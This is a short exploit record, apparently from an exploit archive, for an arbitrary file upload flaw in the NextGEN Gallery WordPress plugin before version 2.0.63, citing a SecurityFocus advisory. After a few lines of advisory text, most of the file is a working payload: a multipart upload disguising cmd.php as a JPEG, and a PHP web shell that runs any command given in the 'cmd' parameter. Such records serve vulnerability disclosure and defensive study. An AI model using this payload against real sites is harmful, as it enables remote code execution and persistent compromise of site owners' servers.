@@ -1,0 +1,26 @@
+source: http://www.securityfocus.com/bid/68414/info
+
+The NextGEN Gallery plugin for WordPress is prone to a vulnerability that lets attackers upload arbitrary files.
+
+An attacker may leverage this issue to upload arbitrary files to the affected computer; this can result in an arbitrary code execution within the context of the vulnerable application.
+
+Versions prior to NextGEN Gallery 2.0.63 are vulnerable. 
+
+cmd.php.jpg
+-----------------------------2427186578189
+Content-Disposition: form-data; name="file"; filename="cmd.php"
+Content-Type: image/jpeg
+
+<HTML><BODY>
+<FORM METHOD="GET" NAME="myform" ACTION="">
+<INPUT TYPE="text" NAME="cmd">
+<INPUT TYPE="submit" VALUE="Send">
+</FORM>
+<pre>
+<?
+if($_GET['cmd']) {
+  system($_GET['cmd']);
+  }
+?>
+</pre>
+</BODY></HTML>
